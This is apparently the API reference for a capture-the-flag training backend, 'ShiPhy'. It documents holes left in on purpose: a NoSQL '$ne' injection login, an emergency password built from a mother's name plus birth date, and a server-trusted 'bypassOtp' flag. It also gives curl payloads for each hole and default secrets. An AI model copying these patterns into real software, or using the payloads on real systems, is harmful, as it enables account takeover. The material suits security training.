# ShiPhy CTF - API Reference & Backend Implementation

## API Endpoints Summary

### Authentication Endpoints

#### Standard Login
```http
POST /api/auth/login
Content-Type: application/json

{
  "username": "intern_001",
  "password": "Password@123"
}

Response: 200 OK
{
  "token": "eyJhbGciOiJIUzI1NiIs...",
  "user": {
    "id": "INT-2024-001",
    "username": "intern_001",
    "role": "intern",
    "fullName": "Raj Kumar",
    "email": "raj.kumar@shiphy.com",
    "department": "Development",
    "joinDate": "2024-01-15",
    "employeeId": "INT-2024-001",
    "isBlocked": false
  }
}
```

#### NoSQL Injection Login (Vulnerable)
```http
POST /api/auth/login-nosql
Content-Type: application/json

{
  "username": "{\"$ne\": \"dummy\"}",
  "password": "anything"
}

Response: 200 OK
Returns employee account (limited access):
{
  "token": "...",
  "user": { ... emp_001 ... },
  "note": "NoSQL injection returned limited employee access"
}
```

#### Emergency Password Login
```http
POST /api/auth/emergency-login
Content-Type: application/json

{
  "username": "admin_abhishek",
  "emergencyPassword": "SHEE22031985"  // [Mother's name (4)] + [DOB DDMMYYYY]
}

Response: 200 OK
{
  "token": "...",
  "user": { ... admin ... },
  "note": "Emergency login granted"
}
```

#### HR Login with OTP Vulnerability
```http
POST /api/hr/login
Content-Type: application/json

Step 1: Password verification
{
  "username": "hr_team",
  "password": "HR@9999"
}

Response: 200 OK (still need OTP)

Step 2: OTP verification (or bypass)
{
  "username": "hr_team",
  "password": "HR@9999",
  "otp": "123456",                    // Or use bypassOtp
  "bypassOtp": true,                   // VULNERABILITY: Server accepts this
  "clientAttemptCount": 0              // Client-side only (ignored)
}

Response: 200 OK
{
  "token": "...",
  "user": { ... hr_team ... },
  "note": "OTP bypass accepted (vulnerable)"
}
```

#### Token Verification
```http
GET /api/auth/verify
Authorization: Bearer <token>

Response: 200 OK
{
  "user": { ... user info ... }
}
```

---

## Protected Endpoints (Require Valid Token)

#### Get Current User
```http
GET /api/auth/me
Authorization: Bearer <token>

Response: 200 OK
{
  "user": { ... }
}
```

#### HR Records (HR Role Only)
```http
GET /api/hr/records
Authorization: Bearer <token>

Response: 200 OK
{
  "records": [
    {
      "id": "INT-2024-001",
      "username": "intern_001",
      "fullName": "Raj Kumar",
      "email": "raj.kumar@shiphy.com",
      "employeeId": "INT-2024-001",
      "motherName": "N/A",
      "dob": null,
      "role": "intern"
    },
    {
      "id": "ADM-2019-001",
      "username": "admin_abhishek",
      "fullName": "Abhishek Shemadi",
      "email": "abhishek.shemadi@shiphy.com",
      "employeeId": "ADM-2019-001",
      "motherName": "Sheetal",
      "dob": "1985-03-22",
      "role": "admin"
    },
    ...
  ]
}
```

#### SSH Flag Endpoint (Admin Role Only)
```http
GET /api/ssh/fetch_flag
Authorization: Bearer <token>

Response: 200 OK
{
  "flag": "SHI{A7F3K2}",
  "secondsRemaining": 7,
  "validForSeconds": 7
}

Note: Flag rotates every 10 seconds
Response changes after 10 seconds:
{
  "flag": "SHI{P9X1Q8}",
  "validForSeconds": 9
}
```

#### Admin Dashboard
```http
GET /api/admin/dashboard
Authorization: Bearer <token> (admin role required)

Response: 200 OK
{
  "message": "Admin dashboard data"
}
```

#### HR Dashboard
```http
GET /api/hr/dashboard
Authorization: Bearer <token> (hr role required)

Response: 200 OK
{
  "message": "HR dashboard data"
}
```

#### Blue Team Alerts
```http
GET /api/blueteam/alerts
Authorization: Bearer <token> (blueteam role required)

Response: 200 OK
{
  "alerts": []
}
```

#### Logout
```http
POST /api/auth/logout
Authorization: Bearer <token>

Response: 200 OK
{
  "message": "Logged out successfully"
}
```

---

## Public Endpoints (No Auth Required)

#### Health Check
```http
GET /api/health

Response: 200 OK
{
  "status": "OK",
  "message": "Shiphy backend is running"
}
```

#### Announcements
```http
GET /api/announcements

Response: 200 OK
{
  "announcements": [
    {
      "id": 1,
      "title": "Welcome Intern",
      "body": "Dashboard updated with your intern information.",
      "type": "general"
    },
    {
      "id": 2,
      "title": "FTE Portal",
      "body": "Selected FTE candidates must log in using the FTE portal.",
      "type": "fte"
    }
  ]
}

Note: FTE Portal announcement appears 2 minutes after first call
```

---

## Backend Implementation Details

### File Structure
```
backend/
├── src/
│   ├── server.js          # Main Express app
│   ├── auth.js            # Authentication handlers
│   ├── database.js        # User database (in-memory)
│   └── flag.js            # Rotating flag generator
├── package.json
└── .env                   # Environment variables
```

### Key Implementation Notes

#### 1. Password Hashing (auth.js)
- Uses bcrypt with 10 rounds
- All passwords are hashed in database
- Frontend never sends passwords (except to backend)
- Passwords never logged

#### 2. JWT Tokens (auth.js)
- Algorithm: HS256
- Secret: `process.env.JWT_SECRET || 'your_super_secret_jwt_key_change_this_in_production'`
- Expiration: 24 hours
- Contains: userId, username, role

#### 3. NoSQL Injection Handler (auth.js)
- Detects JSON-like strings in username
- Looks for `$ne` operator
- Returns employee account (not admin)
- Demonstrates: injection ≠ full compromise

#### 4. Emergency Password (auth.js)
- Format: `[Mother's Name (4 chars)] + [DOB DDMMYYYY]`
- Stored in database (encrypted in production)
- Case-insensitive matching possible
- Used for account recovery

#### 5. OTP Vulnerability (auth.js)
- Formula: `HMAC-SHA256(username + 30s_window, secret)`
- Window: 30 seconds (static throughout window)
- Vulnerability: `bypassOtp` flag accepted
- Weakness: Client-side attempt counter not validated
- Server accepts `clientAttemptCount` but ignores it

#### 6. Rotating Flag (flag.js)
- Window: 10 seconds
- Formula: `HMAC-SHA256(windowStart, secret)`
- Output: Base36 hash converted to compact format
- Regenerates every 10 seconds
- Cannot be reused/shared

#### 7. In-Memory Database (database.js)
- 6 test users pre-configured
- No persistence (resets on restart)
- Suitable for CTF/testing only
- Would be MongoDB/PostgreSQL in production

---

## Environment Configuration

### Required Environment Variables (backend/.env)
```
PORT=5000
NODE_ENV=development
JWT_SECRET=your_super_secret_jwt_key_change_this_in_production
OTP_SECRET=otp_dev_secret
FLAG_SECRET=shi_core_secret
```

### Frontend Configuration (root/.env)
```
VITE_API_URL=http://localhost:5000
```

---

## Authentication Flow Diagram

```
User Input (Username/Password)
    ↓
Frontend validates format
    ↓
POST /api/auth/login (or /api/hr/login)
    ↓
Backend: findUserByUsername()
    ↓
Backend: bcrypt.compareSync(password, hash)
    ↓
Password Match?
    ├─ NO → 401 Unauthorized
    └─ YES → Generate JWT Token
              ↓
              Return Token + User Info
              ↓
Frontend: Store token in localStorage
          Store user in localStorage
          ↓
          Redirect to Dashboard
```

---

## OTP Vulnerability Flow

```
User Enters Password
    ↓
✅ Password Correct → OTP Step
    ↓
User Opens DevTools Console
    ↓
window.bypassOtp = true
    ↓
User enters ANY OTP (e.g., "000000")
    ↓
POST /api/hr/login with { bypassOtp: true }
    ↓
Server checks: if (bypassOtp) → ✅ GRANT ACCESS
    ↓
Token returned, HR Dashboard accessible
```

---

## Testing with Curl

### Test Normal Login
```bash
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "intern_001",
    "password": "Password@123"
  }'
```

### Test NoSQL Injection
```bash
curl -X POST http://localhost:5000/api/auth/login-nosql \
  -H "Content-Type: application/json" \
  -d '{
    "username": "{\"$ne\": \"dummy\"}",
    "password": "anything"
  }'
```

### Test Emergency Password
```bash
curl -X POST http://localhost:5000/api/auth/emergency-login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin_abhishek",
    "emergencyPassword": "SHEE22031985"
  }'
```

### Test HR Login with Bypass
```bash
curl -X POST http://localhost:5000/api/hr/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hr_team",
    "password": "HR@9999",
    "otp": "000000",
    "bypassOtp": true,
    "clientAttemptCount": 0
  }'
```

### Get HR Records
```bash
curl -X GET http://localhost:5000/api/hr/records \
  -H "Authorization: Bearer <your_token_here>"
```

### Fetch Rotating Flag
```bash
curl -X GET http://localhost:5000/api/ssh/fetch_flag \
  -H "Authorization: Bearer <admin_token_here>"
```

---

## Error Responses

All errors follow standard format:

```json
{
  "error": "Error message here"
}
```

### Common Status Codes
- **200 OK** - Success
- **400 Bad Request** - Missing fields
- **401 Unauthorized** - Invalid credentials or no token
- **403 Forbidden** - Insufficient permissions
- **404 Not Found** - User not found
- **500 Internal Server Error** - Server error

---

## Production Deployment Checklist

When deploying to production (DO NOT USE CTF IMPLEMENTATION):

- [ ] Change JWT_SECRET to strong random value
- [ ] Change OTP_SECRET to random value
- [ ] Change FLAG_SECRET to random value
- [ ] Remove NoSQL injection endpoint
- [ ] Remove emergency password endpoint
- [ ] Use real database (MongoDB, PostgreSQL)
- [ ] Implement proper rate limiting
- [ ] Add request logging/monitoring
- [ ] Use HTTPS only (certificates)
- [ ] Implement CSRF protection
- [ ] Add input validation/sanitization
- [ ] Remove console.log statements
- [ ] Enable production error handling
- [ ] Set NODE_ENV=production
- [ ] Implement proper CORS configuration
